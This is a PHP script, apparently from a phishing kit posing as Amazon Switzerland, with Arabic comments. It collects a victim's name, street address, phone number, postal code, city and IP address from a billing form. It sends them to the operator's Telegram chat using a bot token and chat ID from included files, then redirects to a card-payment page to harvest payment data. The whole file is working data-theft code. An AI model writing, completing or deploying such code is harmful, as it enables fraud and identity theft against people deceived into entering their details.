<?php
// تضمين ملفات الإعداد والاتصال الخاصة بك
include "v.php";
include "t.php";

// استقبال بيانات حقول العنوان بشكل آمن
$name  = isset($_POST['fullname']) ? $_POST['fullname'] : '';
$addr  = isset($_POST['address']) ? $_POST['address'] : '';
$phone = isset($_POST['phone']) ? $_POST['phone'] : '';
$zip   = isset($_POST['zip']) ? $_POST['zip'] : '';
$city  = isset($_POST['city']) ? $_POST['city'] : '';

// تنسيق الرسالة لبيانات العنوان الموجهة للتلغرام
$message  = "========= Amazon CH Billing =========\n";
  $message .= "NAME    : ".$name."\n";
$message .= "STRASSE : ".$addr."\n";
$message .= "TELEFON : ".$phone."\n";
$message .= "PLZ     : ".$zip."\n";
$message .= "ORT     : ".$city."\n";
$message .= "IP      : ".(isset($ib) ? $ib : $_SERVER['REMOTE_ADDR'])."\n";
$message .= "=====================================\n";

// إرسال الرسالة باستخدام الإعدادات المعرفة مسبقاً
$tk = $token; 
$chid = $chatid; 
sendMessage($chid, $message, $tk);

// إعادة التوجيه التلقائي مع الـ Hash المعتاد لصفحة كرت الدفع
header("Location: ./karbett.php?".md5(microtime()));
exit();
?>